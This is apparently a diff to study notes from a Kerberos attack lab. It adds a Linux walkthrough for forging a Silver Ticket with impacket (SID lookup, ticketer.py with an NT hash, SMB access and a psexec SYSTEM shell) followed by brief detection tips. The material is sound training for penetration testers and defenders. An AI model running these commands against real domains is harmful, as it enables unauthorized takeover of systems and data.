@@ -2244,7 +2244,7 @@ C:\Windows\system32>whoami
 nt authority\system
 ```
 
-#### Detection
+### Detection
 
 This type of persistence is challenging to detect because Golden Tickets are valid TGTs. Windows event logs don't distinguish between a legitimate TGT and a maliciously crafted Golden Ticket. Also, resetting the impersonated account's password does not invalidate the ticket.
 
@@ -2273,7 +2273,7 @@ To forge a Silver Ticket, an attacker requires the NTLM password's hash or keys 
 
 The ticket can be forged using `Mimikatz` or `impacket` and the get injected into memory to access a target service remotely. A Silver Ticket is a forged TGS ticket, so using one does not require communication with the DC. Any associated event logs are created on the target host. Therefore, Silver Tickets are more stealthy than Golden Tickets.
 
-#### Windows
+### Windows
 
 Different elements are needed to forge a Silver Ticket. First, you need the domain's SID. This piece of information can be retrieved using PowerView's `Get-DomainSID` function.
 
@@ -2451,3 +2451,117 @@ Microsoft Windows [Version 10.0.17763.2628]
 C:\Windows\system32>hostname
 SQL01
 ```
+
+### Linux
+
+On Linux, `impacket` can be used to craft a Silver Ticket. The tool [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) will retrieve the domain's, groups', and users' SID.
+
+```bash
+d41y@htb[/htb]$ lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Brute forcing SIDs at dc01.inlanefreight.local
+[*] StringBinding ncacn_np:dc01.inlanefreight.local[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-2974783224-3764228556-2640795941
+498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: INLANEFREIGHT\Administrator (SidTypeUser)
+501: INLANEFREIGHT\Guest (SidTypeUser)
+502: INLANEFREIGHT\krbtgt (SidTypeUser)
+503: INLANEFREIGHT\DefaultAccount (SidTypeUser)
+512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
+513: INLANEFREIGHT\Domain Users (SidTypeGroup)
+<SNIP>
+```
+
+Once you have the domain's SID, you can craft a Silver Ticket using [ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py).
+
+```bash
+d41y@htb[/htb]$ ticketer.py -nthash ff955e93a130f5bb1a6565f32b7dc127 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local -spn cifs/sql01.inlanefreight.local Administrator
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for inlanefreight.local/Administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+```
+
+The ticket has been forged and saved in the current `Adminstrator.ccache` directory. You can now use this ticket by importing it in the `KRB5CCNAME` environment variable and using any impacket tool with `-k` parameter.
+
+```bash
+d41y@htb[/htb]$ export KRB5CCNAME=./Administrator.ccache
+d41y@htb[/htb]$ smbclient.py -k -no-pass sql01.inlanefreight.local
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
+
+Type help for list of commands
+# shares
+
+ADMIN$
+C$
+DB_backups
+IPC$
+
+# use C$
+# ls
+
+drw-rw-rw-          0  Fri Aug 14 13:06:44 2020 $Recycle.Bin
+-rw-rw-rw-     389408  Sat Jul 25 06:16:23 2020 bootmgr
+-rw-rw-rw-          1  Sat Jul 25 06:16:23 2020 BOOTNXT
+drw-rw-rw-          0  Fri Jul 31 04:16:35 2020 Config.Msi
+drw-rw-rw-          0  Tue Jul 28 03:24:52 2020 DB_backups
+drw-rw-rw-          0  Sat Jul 25 05:20:01 2020 Documents and Settings
+-rw-rw-rw-  738197504  Fri Jul 31 04:43:10 2020 pagefile.sys
+drw-rw-rw-          0  Sat Jul 25 06:18:27 2020 PerfLogs
+drw-rw-rw-          0  Fri Jul 31 03:59:25 2020 Program Files
+drw-rw-rw-          0  Fri Jul 31 03:59:35 2020 Program Files (x86)
+drw-rw-rw-          0  Tue Jul 28 05:27:08 2020 ProgramData
+drw-rw-rw-          0  Sat Jul 25 05:20:05 2020 Recovery
+drw-rw-rw-          0  Tue Jul 28 03:03:22 2020 StorageReports
+drw-rw-rw-          0  Tue Jul 28 03:02:51 2020 System Volume Information
+drw-rw-rw-          0  Sat Aug 15 04:54:00 2020 Tools
+drw-rw-rw-          0  Fri Aug 14 13:06:37 2020 Users
+drw-rw-rw-          0  Mon Aug 17 21:26:39 2020 Windows
+```
+
+And since the SPN is in clear text and can be modified on the fly, impacket can do it for you and get you a remote shell on the compromised system.
+
+```bash
+d41y@htb[/htb]$ export KRB5CCNAME=./Administrator.ccache
+d41y@htb[/htb]$ psexec.py -k -no-pass sql01.inlanefreight.local
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on sql01.inlanefreight.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file VyoVmCpn.exe
+[*] Opening SVCManager on sql01.inlanefreight.local.....
+[*] Creating service YHLC on sql01.inlanefreight.local.....
+[*] Starting service YHLC.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+### Detection
+
+Silver Tickets are more limited when compared to Golden Tickets because their scope is only for the service that is being targeted on a specific host. However, they can be utilized to remain stealthier. Silver Tickets can be used for persistence when used to access computer-hosted services. Since computer account password rotation may be disabled, and AD does not prevent computer accounts from accessing resources, this type of Silver Ticket could likely be used for a very long time.
+
+Silver Tickets forged with Mimikatz can be detected in a few ways:
+
+- The account DOMAIN field is blank.
+- The account DOMAIN field contains DOMAIN FQDN instead of just domain.
+
